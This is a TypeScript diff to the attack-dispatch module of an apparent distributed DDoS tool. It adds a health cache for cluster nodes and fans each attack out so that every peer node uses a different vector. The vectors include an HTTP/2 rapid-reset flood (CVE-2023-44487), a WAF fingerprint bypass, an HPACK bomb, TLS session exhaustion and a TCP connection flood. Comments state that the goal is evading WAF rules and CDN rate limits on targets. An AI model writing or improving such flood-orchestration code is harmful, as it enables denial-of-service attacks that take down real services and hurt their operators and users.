@@ -27,17 +27,88 @@ import {
 import { proxyCache } from "./proxies.js";
 import { CLUSTER_NODES } from "./cluster.js";
 
-// ── Cluster fan-out — fires geass-override to all peer nodes (fire & forget) ─
+// ── Cluster node health cache — refreshed every 60 s ─────────────────────────
+// Prevents sending attacks to nodes that are offline/overloaded.
+// Structure: nodeUrl → { online, checkedAt }
+interface NodeHealth { online: boolean; checkedAt: number }
+const nodeHealthCache = new Map<string, NodeHealth>();
+const HEALTH_TTL_MS   = 60_000; // 60-second health cache
+
+// Smart method pool — each peer node gets a different vector to avoid
+// all cluster nodes hitting the same rate-limit or WAF rule simultaneously.
+// Self (node 0) always runs whatever method was requested.
+const SMART_PEER_METHODS = [
+  "rapid-reset",        // node 1: HTTP/2 RST flood (CVE-2023-44487)
+  "waf-bypass",         // node 2: JA3 + Chrome H2 fingerprint bypass
+  "h2-rst-burst",       // node 3: H2 RST burst (rapid-reset variant)
+  "tls-session-exhaust",// node 4: TLS session cache saturation
+  "bypass-storm",       // node 5: 3-phase composite layer bypass
+  "http-flood",         // node 6: high-concurrency HTTP flood
+  "hpack-bomb",         // node 7: H2 HPACK table OOM
+  "conn-flood",         // node 8: TCP connection table exhaustion
+  "geass-ultima",       // node 9+: final form (all 9 vectors)
+];
+
+// Check a single node's health (non-blocking — result cached)
+async function refreshNodeHealth(nodeUrl: string): Promise<boolean> {
+  try {
+    const r = await fetch(`${nodeUrl.replace(/\/$/, "")}/api/healthz`, {
+      signal: AbortSignal.timeout(3000),
+    });
+    const online = r.ok;
+    nodeHealthCache.set(nodeUrl, { online, checkedAt: Date.now() });
+    return online;
+  } catch {
+    nodeHealthCache.set(nodeUrl, { online: false, checkedAt: Date.now() });
+    return false;
+  }
+}
+
+// ── Cluster fan-out — health-aware, smart-method-per-node (fire & forget) ────
+// Each peer node receives a different attack vector to:
+//   1. Bypass per-method WAF rules (different signatures per node)
+//   2. Exploit CDN rate-limit pools across multiple vectors simultaneously
+//   3. Avoid all nodes hitting the same resource pool on the target
 function fanOutToCluster(target: string, port: number, method: string, duration: number, threads: number): void {
   if (CLUSTER_NODES.length === 0) return;
-  for (const nodeUrl of CLUSTER_NODES) {
-    void fetch(`${nodeUrl.replace(/\/$/, "")}/api/attacks?peer=1`, {
-      method:  "POST",
-      headers: { "Content-Type": "application/json" },
-      body:    JSON.stringify({ target, port, method, duration, threads }),
-      signal:  AbortSignal.timeout(8000),
-    }).catch(() => { /* peer may be unreachable — ignore */ });
-  }
+
+  CLUSTER_NODES.forEach((nodeUrl, idx) => {
+    const cached   = nodeHealthCache.get(nodeUrl);
+    const now      = Date.now();
+    const isStale  = !cached || now - cached.checkedAt > HEALTH_TTL_MS;
+    const isOnline = cached?.online ?? true; // optimistic if never checked
+
+    // Skip nodes known to be offline (stale cache means re-check before deciding)
+    if (!isStale && !isOnline) {
+      // Node was recently checked and is offline — skip silently
+      return;
+    }
+
+    // Assign a distinct vector per peer node (index 0 = first peer, not self)
+    const peerMethod = SMART_PEER_METHODS[idx % SMART_PEER_METHODS.length] ?? method;
+
+    const doSend = () => {
+      void fetch(`${nodeUrl.replace(/\/$/, "")}/api/attacks?peer=1`, {
+        method:  "POST",
+        headers: { "Content-Type": "application/json" },
+        body:    JSON.stringify({ target, port, method: peerMethod, duration, threads }),
+        signal:  AbortSignal.timeout(8000),
+      }).catch(() => {
+        // Mark node as offline on connection failure
+        nodeHealthCache.set(nodeUrl, { online: false, checkedAt: Date.now() });
+      });
+    };
+
+    if (isStale) {
+      // Re-check health, then send only if online
+      void refreshNodeHealth(nodeUrl).then(online => {
+        if (online) doSend();
+      });
+    } else {
+      // Cache is fresh and node is online — send immediately
+      doSend();
+    }
+  });
 }
 
 const router: IRouter = Router();
